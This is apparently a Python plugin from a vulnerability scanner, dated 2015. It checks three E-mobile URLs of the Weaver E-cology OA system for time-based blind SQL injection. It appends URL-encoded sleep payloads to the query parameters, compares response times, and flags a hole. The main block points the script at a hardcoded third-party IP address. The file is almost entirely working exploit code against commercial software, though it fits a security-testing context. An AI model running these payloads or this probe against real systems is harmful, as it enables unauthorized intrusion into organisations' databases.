#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:泛微oa E-cology sql bool盲注集合  
#Refer: http://www.wooyun.org/bugs/wooyun-2015-0104782
#Data:2015/12/19
import time

def assign(service,arg):
    if service=="weaver_oa":
        return True,arg

def audit(arg):
    vun_urls=['E-mobile/source_page.php?pagediff=email&emailid=1',
             'E-mobile/emailreply_page.php?detailid=1',
             'E-mobile/email_page.php?detailid=1']
    ture= "%20xor%201%3Dif%281%2Csleep%280%29%2C1%29%20limit%201"
    flase="%20xor%201%3Dif%281%2Csleep%285%29%2C1%29%20limit%201"
    
    for vun_url in vun_urls:
        start_ture=time.time()
        code0,head,res,errcode,finalurl=curl.curl2(arg+vun_url+ture)
        end_ture=time.time()
        ture_time=end_ture-start_ture
        start_flase=time.time()
        code5,head,res,errcode,finalurl=curl.curl2(arg+vun_url+flase)
        end_flase=time.time()
        flase_time=end_flase-start_flase
        if code0==200 and code5==200 and flase_time>5 and 2>ture_time:
            security_hole("bool sql inject:"+arg+vun_url)
                    
if __name__=="__main__":
    from dummy import *
    audit(assign('weaver_oa','http://219.232.254.131:8082/')[1])